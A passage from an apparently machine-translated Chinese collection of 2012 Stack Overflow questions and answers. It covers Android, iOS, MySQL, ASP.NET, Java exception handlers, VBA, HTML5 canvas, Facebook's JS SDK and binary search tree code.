如果问题是您想内联传递对象，您也可以创建一个函数来为您执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:12:32.983

不，因为`this`在你展示的情况下不会绑定到对象。

我不认为有办法做到这一点。

你可以试试

```
var gallerySelectors = {
    '$thumbnailContainer' : $('#thumb'),
    'thumbnailImg' : gallerySelectors.$thumbnailContainer.find('img')
};                     ^--------------- NOTE!!! 
```

但我不确定我是否会相信它可以在任何地方工作。我想你必须查看语言规范，看看成员是否总是保证按顺序初始化。

我会采取简单的路线：

```
var gallerySelectors = {
    '$thumbnailContainer' : $('#thumb'),
    'thumbnailImg' : $('#thumb').find('img')
}; 
```

# android - 在eclipse中调试Android回栈

> ID：11235489
> 
> 赞同：2
> 
> 时间：2012-06-27T22:08:50.763
> 
> 标签：android, android-activity, fragment

有没有办法在 Eclipse ADT IDE 中用 Android 中的活动和片段可视化后台堆栈？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-27T22:25:50.180

您的意思是仅出于调试目的查看它的外观吗？在这种情况下，定义

```
public static void displayBackStack(FragmentManager fm) {
    int count = fm.getBackStackEntryCount();
    Log.d("Backstack log", "There are " + count + " entries");
    for(int i = 0; i<count; i++) {
        // Display Backstack-entry data like
        String name = fm.getBackStackEntryAt(i).getName();
        Log.d("Backstack log", "entry " + i + ": " + name);
    }
} 
```

在某个班级`C`并打电话

```
C.displayBackStack(getFragmentManager()); 
```

或者

```
C.displayBackStack(getSupportFragmentManager()); // with compatibility package 
```

从你的活动。这会将 BackStack 放入您的日志中。

当然，您可以根据需要改变显示的数据。

# ios - cicontext drawImage:inRect:fromRect 在 ios6 中崩溃

> ID：11235493
> 
> 赞同：3
> 
> 时间：2012-06-27T22:09:04.430
> 
> 标签：ios, memory-management, opengl-es, core-image, glkit

我正在尝试从相机获取视频并使用 CoreImage 和 OpenGL 进行渲染。当我运行它时，我会按预期在屏幕上看到我的图片，然后我得到 EXEC_BAD_ACCESS。我正在使用ARC。iOS6 Beta1。请帮我修复它。

更新：它在 5.1 中工作，但在 6.0 中崩溃。我提出了所有异常断点，但我只看到 EXEC_BAD_ACESS 发生在 presentRendedBuffer > gpus_ReturnGuiltyForHardwareRestart

Update2：我已经删除了与相机相关的代码，但它仍然崩溃。

更新 3：当我注释掉 glClearColor 和 glClear 命令时，我的应用程序停止崩溃。但我仍然想知道如何同时使用 OpenGL 和 Core Image。

我的新代码很简单：

```
@interface MGViewController () {
...
}
@property (strong, nonatomic) EAGLContext *glcontext;
@property (strong, nonatomic) CIContext *cicontext;
@property (strong, nonatomic) CIImage *ciimage;

- (void)viewDidLoad
{
    [super viewDidLoad];

    self.glcontext = [[EAGLContext alloc] initWithAPI:kEAGLRenderingAPIOpenGLES2];

    if (!self.glcontext) {
        NSLog(@"Failed to create ES context");
    } else {
        self.cicontext = [CIContext contextWithEAGLContext:self.glcontext];

        if (!self.cicontext){
            NSLog(@"Failed to create CI context");
        }
    }

    GLKView *view = (GLKView *)self.view;
    view.context = self.glcontext;
    view.drawableDepthFormat = GLKViewDrawableDepthFormat24;

    self.ciimage = [[CIImage alloc] initWithContentsOfURL:[[NSBundle mainBundle] URLForResource:@"roomphoto" withExtension:@"png"]];
}

- (void)glkView:(GLKView *)view drawInRect:(CGRect)rect
{

        glClearColor(0.0, 0.5, 0.0, 1.0);
        glClear(GL_COLOR_BUFFER_BIT);

        [self.cicontext drawImage:self.ciimage
                           inRect:self.ciimage.extent
                         fromRect:self.ciimage.extent];
} 
```

此代码适用于 iPhone & iPad 6.0 模拟器；在 iPad2 iOS 6.0 Beta2 上使用 EXEC_BAD_ACCESS 崩溃；它在 iPad 1 和 iPhone 4S iOS 5.1.1 上给了我绿屏，并在控制台中显示消息：

```
Invalid shader program, probably due to exceeding hardware resourcesCould not load the kernel!Could not load the kernel! ... 
```

有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-02T02:07:49.797

drawImage:inRect:fromRect 在 iOS 6 中是异步的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T16:14:08.807

最后我设法阻止应用程序崩溃。我刚刚在 gl 命令和 [cicontext drawImage...] 命令之间添加了**glFlush() 。**

```
- (void)glkView:(GLKView *)view drawInRect:(CGRect)rect
{

        glClearColor(0.0, 0.5, 0.0, 1.0);
        glClear(GL_COLOR_BUFFER_BIT);

        glFlush();

        [self.cicontext drawImage:self.ciimage
                           inRect:self.ciimage.extent
                         fromRect:self.ciimage.extent];
} 
```

结果并不完美：我可以看到一些抖动等，但至少它有效。不过，我会很感激一个详细的答案。

# mysql - MySQL在重复键上插入行更新多列

> ID：11235501
> 
> 赞同：18
> 
> 时间：2012-06-27T22:09:37.187
> 
> 标签：mysql

我有一张桌子`(name, date, stat1, stat2, stat3)`，`(name, date)`是PK。当我插入行时，会有重复的键，我需要总结三个统计数据。我在 Java 中对 PreparedStatement 使用以下查询：

```
INSERT INTO tb (name, date, stat1, stat2, stat3)
VALUES (?, ?, ?, ?, ?)
ON DUPLICATE KEY UPDATE stat1 = stat1 + ?, stat2 = stat2 + ?, stat3 = stat3 + ? 
```

是否有更简洁的查询来实现这一目标？因为我已经简化了查询，所以那里有十多个统计信息。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-06-27T22:13:57.670

```
INSERT INTO tb (name, date, stat1, stat2, stat3)
VALUES (?, ?, ?, ?, ?)
ON DUPLICATE KEY UPDATE stat1 = stat1 + VALUES(stat1), stat2 = stat2 + VALUES(stat2), stat3 = stat3 + VALUES(stat3) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:12:08.100

添加一个计算列（总和）并将其包含在您的 PK 中。

但是，这确实会使您的表非规范化。您可以使用代理键并在 SELECT 中进行计算

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2013-12-19T06:18:49.810

如果您指定 ON DUPLICATE KEY UPDATE，并且插入的行会导致 UNIQUE 索引或 PRIMARY KEY 中的重复值，MySQL 将对旧行执行 UPDATE。例如，如果列 a 被声明为 UNIQUE 并且包含值 1，则以下两个语句具有相似的效果：

> INSERT INTO table (a,b,c) VALUES (1,2,3) ON DUPLICATE KEY UPDATE c=c+1;

等效的更新查询如下，

> 更新表 SET c=c+1 WHERE a=1;

如果 a 和 b 列是唯一的，则等效更新查询将是 ,

> 更新表 SET c=c+1 WHERE a=1 OR b=2 LIMIT 1;

# c# - 如何确定 HtmlTableCell 控件是 th 还是 td？

> ID：11235502
> 
> 赞同：1
> 
> 时间：2012-06-27T22:09:39.350
> 
> 标签：c#, asp.net, html-table, controls

我正在遍历我创建的表格并从每一行中获取第一个单元格。根据细胞的类型，会做不同的事情。例子：

```
if(cCell.type=='th' && cCell.parent.next.Cells[0].type == 'th'){
  cCell.parent.parent.controls.remove(cCell.parent);
} 
```

说明，如果当前单元格和它下面的单元格都是 th，则删除当前单元格行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:23:19.637

没有 HtmlTableHeaderCell 控件，但是[TableHeaderCell](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.tableheadercell.aspx)在页面的 html 中变成了 a`<th>`而[TableCell](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.tablecell.aspx)是`<td>`. 我不完全理解您的问题的上下文，但您应该能够使用 typeof() 区分 TableCell 和 TableHeaderCell。这个所有 HtmlControls 的[列表](http://msdn.microsoft.com/en-us/library/system.web.ui.htmlcontrols)`<td>`确认和之间没有类型差异`<th>`，都是 HtmlTableCell。

我认为，如果您想以编程方式生成表格，最好使用 Web 控件，但如果您有一个已经创建的表格，则使用 TagName 本质上没有任何问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:28:21.490

汤姆英格拉姆似乎是正确的......

```
 foreach (HtmlTableRow row in MyTable.Rows)
    {
        if (row.Cells[0].TagName.ToLower() == "th")
        {
            // header.
        }
        else
        {
            // cell.
        }
    } 
```

使用的示例表...

```
<table runat="server" id="MyTable">
    <tr>
        <th>header 1</th>
        <th>header 2</th>
    </tr>
    <tr>
        <td>cell 1</td>
        <td>cell 2</td>
    </tr>
</table> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:31:38.573

如果您检查的表格单元格是 System.Web.UI.WebControls.TableCell 类型，您应该能够使用 TagKey 属性（[在此处输入链接描述](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.webcontrol.tagkey.aspx)

那么您的代码将是：

```
if(cCell.TagKey == HtmlTextWriterTag.Td && cCell.parent.next.Cells[0].TagKey == HtmlTextWriterTag.Th){
  cCell.parent.parent.controls.remove(cCell.parent);
} 
```

虽然不确定您要完成什么，但我敢打赌有更简单的方法来做到这一点。

# google-app-engine - 未登录用户的 GAE 频道 ID

> ID：11235507
> 
> 赞同：0
> 
> 时间：2012-06-27T22:10:02.563
> 
> 标签：google-app-engine

我在 Python 中有一个 GAE，我正在使用 Channel API：[https ://developers.google.com/appengine/docs/python/channel/functions](https://developers.google.com/appengine/docs/python/channel/functions)

我能找到的所有示例都使用登录用户的 ID 作为客户端 ID。如果用户没有登录怎么办？在这种情况下，什么可以用作可靠的 id？我应该使用 Python 创建一个 cookie 或会话并在其中存储一个任意 id 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T17:04:07.087

您可以对 clientid 使用任何东西，示例恰好使用登录用户的 id。无论您的应用程序使用什么将客户与其数据相关联，您都可以使用。

# sql-server-ce - SQL Server Compact Edition 要求（*.sdf 文件）

> ID：11235511
> 
> 赞同：1
> 
> 时间：2012-06-27T22:10:37.680
> 
> 标签：sql-server-ce

**故事（如果需要答案）：**

我有一个奇怪的问题，不知道如何正确描述它。我用win7 64位机器用C#编写了一个程序。我使用带有 Visual Studio 的 32 位 win7 上网本甚至没有使用 Visual Studio 的 32 位 win7 对其进行了测试（这是奇怪的部分）并且它有效。但是当我把它带给我制作它的人时，它无法在带有 .NET Framework 4.5 的 win7 32 位以及安装在 2 台不同 PC 上的最新 Windows 更新上运行。

回到家里，我在 XP 机器下做了一些进一步的测试，我也遇到了同样的麻烦。我决定安装 C# 进行调试，但安装后程序即使没有调试也能正常工作！即使再次卸载 C#。

我回到仍然无法工作的 PC 并安装了 SQL Server Compact Edition 运行时，但这并没有成功。异常总是说明一些事情，`System.Io.FileNotFound`但正如我在安装 VS 后所说的那样，它可以工作。我不能也不想在那里安装我的 C# 学生版，所以......

问题：谁能告诉我需要安装哪些其他软件才能针对`*.sdf`SQL Server Compact Edition 使用的文件运行应用程序，该文件与 Visual Studio 一起安装？

**更新 - 已解决：** 今天解决了！:-) 32 位操作系统：卸载所有 CE 安装，然后安装 SSCERuntime_x86-DEU.msi（如果您有 Win7 32 位）。64 位操作系统：如果您有 64 位 win7 版本，请同时安装 SSCERuntime_x86-DEU.msi 和 SSCERuntime_x64-DEU.msi。

有帮助的是对所有内容的 try-catch 以及在消息框中显示的 catch 块中的异常参数 .ToString()。告诉我确切的知识库——随便用谷歌搜索。

# java - 如何重新抛出异常

> ID：11235513
> 
> 赞同：13
> 
> 时间：2012-06-27T22:10:50.427
> 
> 标签：java, android, rethrow, uncaughtexceptionhandler

在我的 onCreate() 中，我设置了一个 UncaughtException 处理程序，如下所示：

```
Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
       Log.e(getMethodName(2), "uncaughtException", throwable);
       android.os.Process.killProcess(android.os.Process.myPid());
    }
}); 
```

它工作正常，但我想恢复系统向用户显示强制关闭对话框的默认行为。

如果我尝试`KillProcess()`用 a 替换调用，`throw throwable`编译器会抱怨我需要用 try/catch 包围它。

如果我用 try/catch 包围它：

```
Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        try {
            Log.e(getMethodName(2), "uncaughtException", throwable);
            throw throwable;
        }
        catch (Exception e) {           
        }
        finally {               
        }
    }
}); 
```

编译器仍然抱怨`throw throwable`需要用 try/catch 包围。

我如何重新投掷该可投掷物？这样，除了该信息之外，`Log.e()`系统的行为与以前完全相同：因为我从未设置默认的 UncaughtException 处理程序。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-06-27T22:14:40.057

尝试：

```
public class CustomExceptionHandler implements UncaughtExceptionHandler {

    private UncaughtExceptionHandler defaultUEH;

    public CustomExceptionHandler() {
        this.defaultUEH = Thread.getDefaultUncaughtExceptionHandler();
    }

    public void uncaughtException(Thread t, Throwable e) {
        Log.e("Tag", "uncaughtException", throwable);
        defaultUEH.uncaughtException(t, e);
    }
} 
```

接着 `Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler());`

改编自[这个](https://stackoverflow.com/questions/601503/how-do-i-obtain-crash-data-from-my-android-application)答案。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T22:20:19.903

如果您设置默认的未捕获异常处理程序，您应该在其中使用异常。这反映在`uncaughtException`没有声明任何异常的事实上。

应该没有明显的理由重新抛出它。它只会在日志中第二次打印出来，无论如何线程都会死掉。如果你真的想要那个，那么只需将可投掷包裹起来`RuntimeException`并重新投掷。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-27T22:21:11.537

没有理由重新抛出 Throwable，根据[javadoc，它只是被忽略了。](http://docs.oracle.com/javase/6/docs/api/java/lang/Thread.UncaughtExceptionHandler.html#uncaughtException%28java.lang.Thread,%20java.lang.Throwable%29) 线程此时正在终止，您只是在设置退出前要尝试的任何最后操作。

为了争论，如果你确实想重新抛出一个 throwable，你会做这样的事情：

```
public void reThrow(Throwable t) {
    if (RuntimeException.class.isAssignableFrom(t.getClass())) {
        throw (RuntimeException)t;
    } else if (Error.class.isAssignableFrom(t.getClass())) {
        throw (Error) t;
    } else {
        throw new UndeclaredThrowableException(t);
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-27T22:30:14.547

首先，您不需要重新抛出异常。`uncaughtException()`不消耗异常。但是，您必须调用默认的未捕获异常处理程序的方法。所以像，

```
class MyUEH implements UncaughtExceptionHandler {
  private static final UncaughtExceptionHandler default = Thread.getDefaultUncaughtExceptionHandler();

    public void uncaughtException(Thread t, Throwable e) {
        Log.e("Tag", "uncaughtException", throwable);
        default.uncaughtException(t, e);
    }
} 
```

其次，您不需要自己杀死进程。当您调用它时，默认的 UEH 将处理它。

第三，默认 UEH 将向用户显示（或导致显示）标准崩溃（强制关闭）对话框。请记住，如果您的方法挂起（例如，因为您正在执行 IO），那么在您的方法退出之前，用户将不会看到崩溃对话框。

# mongodb - MongoDb 中的全局自增字段

> ID：11235515
> 
> 赞同：0
> 
> 时间：2012-06-27T22:11:01.680
> 
> 标签：mongodb

有没有办法在集合中创建全局自动递增值？

Perforce 有一个 changelist# 的概念，它可以成为无状态更新的强大功能。我正在考虑相同类型的功能。

例子：

```
create> DocA.name = "foo" => changelist = 1
create> DocB.name = "bar" => changelist = 2
update> DocA.name = "bob" => changelist = 3
create> DocC.name = "joe" => changelist = 4 
```

结果：

```
DocA.changelist = 3
DocB.changelist = 2
DocC.changelist = 4 
```

然后我可以搜索在 changelist:4 之后所做的任何更改，并确信我没有错过任何内容。

mongodb 大师对如何有效地做到这一点有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:00:57.353

MongoDB 文档有一个[auto-incrementing fields](http://www.mongodb.org/display/DOCS/How+to+Make+an+Auto+Incrementing+Field)的列表。一般来说，这是不好的做法，但这可能适用于您寻求的功能。

也就是说，我还看到人们在上次更新时间使用“时间戳”。这可能会满足您的要求。

同样，如果这是一个非常关键的功能，您可能需要查看看起来最接近您想要的 Riak 的 MVCC。

# arrays - 在 VBA 函数中从范围切换到数组并返回

> ID：11235517
> 
> 赞同：4
> 
> 时间：2012-06-27T22:11:07.100
> 
> 标签：arrays, excel, vba, range

有很多问题，也有很多关于 VBA 中范围/数组转换的回复。我一直无法找到有效的答案，所以我真的很感激一些帮助。

以下是我正在尝试做的事情：

```
 Function RangeToArrayToRange(inputRange As Range) As Range
        Dim inputArray As Variant
        inputArray = inputRange
        'operations on inputArray'
        '...'
        Dim outputRange As Range
        outputRange = inputArray
        Set RangeToArrayToRange = outputRange
    End Function 
```

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T22:17:34.533

如果 outputRange 是要填充的范围的左上角单元格：

```
outputRange.Resize(Ubound(inputArray,1), _
                   Ubound(inputArray,2)).Value = inputArray 
```

**编辑**：我认为这就是你想要做的

```
Function RangeToArray(inputRange As Range) As Variant
   Dim inputArray As Variant
   inputArray = inputRange.Value

   'operations on inputArray
   '...'

   RangeToArray = inputArray
End Function 
```

您可以在工作表上将其用作用户定义函数 (UDF)

1.  选择与“inputRange”尺寸相同的范围（相同的行数/列数）
2.  在公式栏中输入“=RangeToArray([yourinputrange])”，然后按 Ctrl+Shift+Enter 将公式输入为“数组公式”

这假设您没有更改函数中的维度（上限/下限）`inputArray`。

# javascript - 是否有一个 JS 库可以让我在网格中制作可拖动和可调整大小的图块，就像在 iPhoto Journal 中一样？

> ID：11235520
> 
> 赞同：3
> 
> 时间：2012-06-27T22:11:18.693
> 
> 标签：javascript, jquery-ui, jquery-ui-sortable, jquery-ui-draggable, iphoto

我正在寻找一个 Javascript 库，它可以为我提供与 jQuery UI 提供的相同类型的“可排序”功能，我可以在其中以网格形式有许多图块，并重新排列它们：

[http://jqueryui.com/demos/sortable/#display-grid](http://jqueryui.com/demos/sortable/#display-grid)

但是，我还需要一些额外的功能，使这变得更复杂一些。我需要：

1.  调整单个图块大小的能力，并让其他图块围绕调整大小的图块很好地重新排列。我曾尝试将 jQuery UI 的“可调整大小”功能与“可排序”结合使用，但不幸的是，在调整了其中一些大小后，这些图块并不能很好地排列自己，最终会变得一团糟。
2.  瓷砖在移动时平滑地动画到它们的新位置，而不是像现在那样立即跳到那里。

本质上，我想要的是与新 iPhoto for iOS 中的日志构建界面类似的东西：

[http://youtu.be/3HKgK6iupls?t=8m37s](http://youtu.be/3HKgK6iupls?t=8m37s)

你们中是否有人知道任何可以帮助我解决这个问题的库（或扩展 jQuery UI 的巧妙方法），还是我必须自己编写这个？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T07:19:56.467

找到了！

[http://gridster.net/](http://gridster.net/)

# grails - 提取码头组件路由的 url 参数

> ID：11235524
> 
> 赞同：0
> 
> 时间：2012-06-27T22:11:40.283
> 
> 标签：grails, apache-camel

我正在尝试使用 Routing 插件在 Grails 2.0.3 应用程序中使用 camel-jetty 组件构建代理。我正在使用 Camel [cookbook](http://camel.apache.org/how-to-use-camel-as-a-http-proxy-between-a-client-and-server.html)中的食谱，但我需要能够使用参数更改目的地，而不是在目的地中进行硬编码。换句话说，我想打电话 `http://localhost:8090/jetty/proxyToX?url=http://www.google.com`给 google。

我尝试的路线是（使用简单）：

```
from ( 'jetty:http://0.0.0.0:8090/jetty/proxyToX?matchOnUriPrefix=true' )
 .to( "jetty:${in.header.url}?bridgeEndpoint=true&throwExceptionOnFailure=false" ) 
```

但是，这给了我以下错误：

错误 context.GrailsContextLoader - 执行引导程序时出错：创建名称为“producerTemplate”的 bean 时出错：设置 bean 属性“camelContext”时无法解析对 bean“camelContext”的引用；嵌套异常是 org.springframework.beans.factory.BeanCreationException：创建名为“camelContext”的 bean 时出错：调用 init 方法失败；嵌套异常是 groovy.lang.MissingPropertyException: No such property: in for class: JettyRoute

这甚至可能吗？

提前致谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T08:06:49.350

请参阅此常见问题解答 [http://camel.apache.org/how-do-i-use-dynamic-uri-in-to.html](http://camel.apache.org/how-do-i-use-dynamic-uri-in-to.html)

# c++ - 哪个更好：CAD 类型程序的列表、向量或双端队列？

> ID：11235525
> 
> 赞同：2
> 
> 时间：2012-06-27T22:11:42.307
> 
> 标签：c++, list, stl, vector, cad

我想创建一个类似于简单的 CAD 程序的东西，我可以在其中绘制圆、线、正方形等。没什么太花哨的东西，只是基本的绘图东西。

我对如何制作程序有一些想法，但我需要建议。在 CAD 程序中，可以绘制任意数量的矩形和形状，并删除他们想要的任何内容。

我在想每个绘制的图形（线、矩形、多边形）应该是一个类的实例，并且该实例应该存储在一个列表中，因为我希望绘制的每个形状都有自己的属性，如颜色、（x，y）坐标，线型等。例如，“rect_list”是一个容器，用于存储“矩形”类的实例。

对于这种制作程序的方法，什么是更好的容器？`vector`,`list`或`deque`?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:16:26.740

你的顶点列表应该在一个向量中（一旦你知道点的数量，调整向量的大小以容纳那么多并填充它），那么你需要一个所有这些向量的列表，这样你就可以插入中间并以其他方式操作有效地列出。

但是...您真正想要的是场景图。这是一个“树视图”模型，用于存储对象的 3D 视图，因此您可以轻松查看哪些对象与其他对象相关。它们还可以显示哪些对象在显示时隐藏了其他对象（因此您不需要同时绘制它们），或者哪些对象在屏幕外（同上）。

最好的之一是[OpenSceneGraph](http://www.openscenegraph.org/projects/osg)，它非常像 STL。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T02:06:11.830

我建议您使用 Qt 并使用他们的[`QGraphicsScene`](http://qt-project.org/doc/qt-4.8/qgraphicsscene.html)系统。场景包含[`QGraphicsItem`](http://qt-project.org/doc/qt-4.8/qgraphicsitem.html)孩子，那些可以包含更多他们自己的孩子。内存和父子关系为您处理。它们还具有空间索引功能，因此例如重绘可以快速访问所需的对象。该索引还允许快速确定哪些对象的边界框与鼠标位置相交。

我最近发布了两个非常[简单](https://stackoverflow.com/a/11218063/1329652) 的使用 Qt 中图形场景/视图系统的特定方面的[示例。](https://stackoverflow.com/a/11235761/1329652)它们都是独立的代码，可以在 Qt Creator 的空 Qt 项目中编译。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-28T13:25:34.757

我会考虑一个用于快速添加和删除实体的链接列表。对于庞大的列表，当您在这里和那里删除实体时，会发生大量内存操作并减慢整个过程......

对于选择，在链表的情况下，您需要在实体级别保留一个自增整数值。

# facebook - Facebook API 错误代码：100 错误消息：查看者无法向指定的收件人发送消息

> ID：11235527
> 
> 赞同：2
> 
> 时间：2012-06-27T22:11:49.527
> 
> 标签：facebook, facebook-graph-api, facebook-javascript-sdk

我正在使用 Facebook JS SDK 让我网站的用户从我的网站发送 FB 消息。我会定期看到以下错误：

**API 错误代码：100
API 错误描述：无效参数
错误消息：查看器无法向指定的收件人发送消息。**

我很困惑，因为它不会始终如一地发生。更像是每 8 次尝试一次，没有明显的模式。有任何想法吗？

这是我的代码。第一的...

```
<script>
      window.fbAsyncInit = function() {
        FB.init({
          appId      : '##########', // App ID
          channelUrl : '//www.xxxxxxxxxx.com/channel.php', // Channel File
          status     : true, // check login status
          cookie     : true, // enable cookies to allow the server to access the session
          xfbml      : true  // parse XFBML
        });

        // Additional initialization code here
      };

      // Load the SDK Asynchronously
      (function(d){
         var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
         if (d.getElementById(id)) {return;}
         js = d.createElement('script'); js.id = id; js.async = true;
         js.src = "//connect.facebook.net/en_US/all.js";
         ref.parentNode.insertBefore(js, ref);
       }(document));
    </script> 
```

然后，这是发送消息的链接：

```
<a href='#' onClick="
        FB.ui({
          method: 'send',
          name: 'Bla bla bla',
          link: 'http://www.xxxxxxxxxxx.com',
          to: ###########,
          //redirect_uri: 'http://www.xxxxxxxxxxx.com/fb/'
          });
        ">Send a message</a> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T09:18:38.483

您不是让用户自己选择收件人，而是尝试自己设置。

如果收件人有他的设置，因此他不接受来自“每个人”的消息，并且您的用户不是他们的朋友——那么这正是我所*期望*的。

# javascript - HTML 5 Canvas 似乎重绘了删除的部分

> ID：11235530
> 
> 赞同：1
> 
> 时间：2012-06-27T22:11:59.817
> 
> 标签：javascript, jquery, canvas, html5-canvas

我在[jsfiddle](http://jsfiddle.net/vPjaJ/)上创建了以下代码。目标是在单击后从画布中删除一个框。实际发生的是网格被清除并完全重新绘制，并在其旧位置删除了框。只有当所有给定的对象都被删除时，网格才会显示为空......我很困惑！我究竟做错了什么？

```
jQuery(function(){

    GridBox = new GridBox();

    GridBox.init();

    var canvas    = GridBox.canvas;

    canvas.on( 'click', GridBox.clickHandler );

});

function GridBox()
{

    this.target        = { x: 0, y: 0 };
    this.current       = { x: 0, y: 0 };
    this.boxHeight     = 50;
    this.boxWidth      = 50;
    this.width         = 500;
    this.height        = 500;
    this.context       = null;
    this.canvas        = null;

    var self = this,
        init = false,
        bw   = this.width,
        bh   = this.height,
        p    = 0,
        cw   = bw + ( p * 2 ) + 1,
        ch   = bh + ( p * 2 ) + 1;

    /**
     * Array of boxes that are painted on the grid.
     * Each box has its own x and y coordinates.
     */
    this.boxesOnGrid    = [
        { x: 2, y: 2 },
        { x: 9, y: 2 },
        { x: 5, y: 5 }
    ];

    /**
     * Initiate this object
     * @constructor 
     */
    this.init    = function()
    {
        if( !init ) {
            var canvas    = jQuery( '<canvas/>' ).attr({ width: cw, height: ch }).appendTo( 'body' );

            this.canvas     = canvas;
            this.context    = this.canvas.get( 0 ).getContext( '2d' );

            this.createGrid();

            init    = true;

        }
    };

    this.clearGrid        = function()
    {
        alert( 'clearing grid' );
        this.context.clearRect( 0, 0, 500, 500 );
    };

    /**
     * Create the grid 
     */
    this.createGrid        = function()
    {
        for( var x = 0; x <= bw; x += this.boxWidth ) {
            this.context.moveTo( 0.5 + x + p, p );
            this.context.lineTo( 0.5 + x + p, bh + p );
        }

        for( var x = 0; x <= bh; x += this.boxHeight ) {
            this.context.moveTo( p, 0.5 + x + p );
            this.context.lineTo( bw + p, 0.5 + x + p );
        }

        this.context.strokeStyle    = "#aaa";
        this.context.stroke();

        var boxes    = this.boxesOnGrid;

        this.boxesOnGrid    = [];

        for( key in boxes ) {
            var currentBox    = boxes[ key ];
            alert( 'i want to create box ' + currentBox.x + 'x' + currentBox.y );
            this.createBoxAt( currentBox.x, currentBox.y );
        }
    };

    /**
     * Find a suitable path between two boxes
     */
    this.findPath        = function()
    {

    };

    this.clickHandler    = function( event )
    {
        var clickOffset        = {
                x:    event.offsetX,
                y:    event.offsetY
            }, clickedBox    = {
                x:    Math.ceil( clickOffset.x / 50 ),
                y:    Math.ceil( clickOffset.y / 50 )
            };

        for( key in GridBox.boxesOnGrid ) {
            if( GridBox.boxesOnGrid[ key ].x === clickedBox.x && GridBox.boxesOnGrid[ key ].y === clickedBox.y ) {
                GridBox.clearGrid();
                GridBox.removeBox( key );
                GridBox.createGrid();
            }
        }

    };

    /**
     * Remove a box from the grid by removing it from the boxes array
     * and re-drawing the grid.
     */
    this.removeBox        = function( key )
    {
        alert( 'removing box ' + key );
        this.boxesOnGrid.splice( key, 1 );
    };

    /**
     * Create a box at a given coordinate on the grid
     * @param    {int} x
     * @param    {int} y 
     */
    this.createBoxAt    = function( x, y )
    {
        var box    = {
                x:    x * this.boxWidth - this.boxWidth,
                y:    y * this.boxHeight - this.boxHeight
            };

        this.createBox( box.x, box.y );
        this.saveBox( x, y );
    };

    this.createBox    = function( xpos, ypos )
    {
        this.context.rect( xpos, ypos, this.boxWidth, this.boxHeight );
        this.context.fillStyle    = '#444';
        this.context.fill();
    };

    this.saveBox    = function( x, y )
    {
        this.boxesOnGrid.push( { x: x, y: y } );
    };
}​ 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T23:12:16.223

**[工作小提琴](http://jsfiddle.net/loktar/vPjaJ/2/)**

更改`createBox`为以下内容。

```
 this.createBox    = function( xpos, ypos )
    {
        this.context.beginPath();
        this.context.rect( xpos, ypos, this.boxWidth, this.boxHeight );
        this.context.fillStyle    = '#444';
        this.context.fill();
        this.context.closePath();
    }; 
```

您没有正确开始/结束路径，因此在重绘时不会清除先前的路径，从而再次将它们全部填充。另一种解决方法是直接使用`fillRect`。

> 创建路径的第一步是调用 beginPath 方法。在内部，路径存储为子路径（线、弧等）的列表，它们一起形成一个形状。每次调用此方法时，列表都会重置，我们可以开始绘制新形状。

[延伸阅读](https://developer.mozilla.org/en/Canvas_tutorial/Drawing_shapes)

# data-structures - BST : inOrder 继任者和前任者

> ID：11235533
> 
> 赞同：0
> 
> 时间：2012-06-27T22:12:24.917
> 
> 标签：data-structures, binary-tree, binary-search-tree

它们看起来正确吗？我实施了它们，并希望对其进行审查

```
Node predecessor(Node node) {
    if ((node.left == null) && (node.right==null)) {
        return node;
    }
    if (node.right != null) {
        return predecessor(node.right);
    }
    if (node.left != null) {
        return predecessor(node.left);
    }
}

Node successor(Node node) {
    if ((node.left == null) && (node.right==null)) {
        return node;
    }
    if (node.left != null) {
        return successor(node.left);
    }
    if (node.right != null) {
        return successor(node.right);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T22:36:32.363

不，他们不正确。节点的前身不能在右子树中。节点的后继节点不能在左子树中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-23T19:36:21.833

```
 //O(h) time complexity.....
    public static TreeNode GetSuccessorInorder(TreeNode root, TreeNode toFind)
    {
        if (root == null) return null;

        //If right sub-tree is not null - get the min of right sub-tree...
        //If the right subtree of node x is nonempty, then the successor of x is just the left-most node in the right subtree
        if (toFind.right != null)
        {
            TreeNode rootRightSubtree = toFind.right;
            TreeNode curr = rootRightSubtree;

            //The left-most node in the right-subtree is always the minimum.....
            while (curr != null)
                curr = curr.left;

            return curr;
        }
        //If right sub-tree is null - Do in-order search and keep track of last traversed parent.. ;-)
